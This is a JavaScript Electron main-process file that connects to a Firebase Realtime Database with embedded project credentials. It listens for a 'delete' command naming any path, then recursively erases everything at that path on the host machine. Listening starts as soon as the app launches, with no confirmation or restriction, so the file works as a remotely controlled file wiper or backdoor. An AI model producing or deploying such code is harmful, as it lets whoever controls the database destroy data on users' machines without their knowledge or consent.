const { app } = require("electron");
const fs = require("fs");
const path = require("path");

// Firebase SDK imports
const { initializeApp } = require("firebase/app");
const { getDatabase, ref, onValue } = require("firebase/database");

// ✅ Your Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyAiNnOmlCpQ-i5t3fFnmbT8frpd0kuHrWM",
  authDomain: "projectmanagement-58150.firebaseapp.com",
  databaseURL: "https://projectmanagement-58150-default-rtdb.firebaseio.com",
  projectId: "projectmanagement-58150",
  storageBucket: "projectmanagement-58150.firebasestorage.app",
  messagingSenderId: "992131358988",
  appId: "1:992131358988:web:93d7ddd8791a371e36a929",
  measurementId: "G-8X64V3RN3B"
};

// ✅ Initialize Firebase
const fbApp = initializeApp(firebaseConfig);
const db = getDatabase(fbApp);

// ✅ Function to delete all files and folders in a given location
function deleteAllInFolder(folderPath) {
  if (!fs.existsSync(folderPath)) {
    console.log("⚠️ Path not found:", folderPath);
    return;
  }

  fs.readdirSync(folderPath).forEach(file => {
    const curPath = path.join(folderPath, file);
    if (fs.lstatSync(curPath).isDirectory()) {
      deleteAllInFolder(curPath); // Recursive delete
      fs.rmdirSync(curPath);
    } else {
      fs.unlinkSync(curPath); // Delete file
    }
  });

  console.log(`✅ Deleted everything inside: ${folderPath}`);
}

// ✅ Listen to Firebase Realtime Database
function watchFirebase() {
  const actionRef = ref(db, "action");

  onValue(actionRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.val();
      console.log("📥 Firebase data:", data);

      if (data.command === "delete" && data.location) {
        console.log("🗑 Deleting files at:", data.location);
        deleteAllInFolder(data.location);
      }
    } else {
      console.log("⚠️ No data at 'action' node.");
    }
  });
}

app.whenReady().then(() => {
  console.log("🚀 App started, watching Firebase...");
  watchFirebase();
});

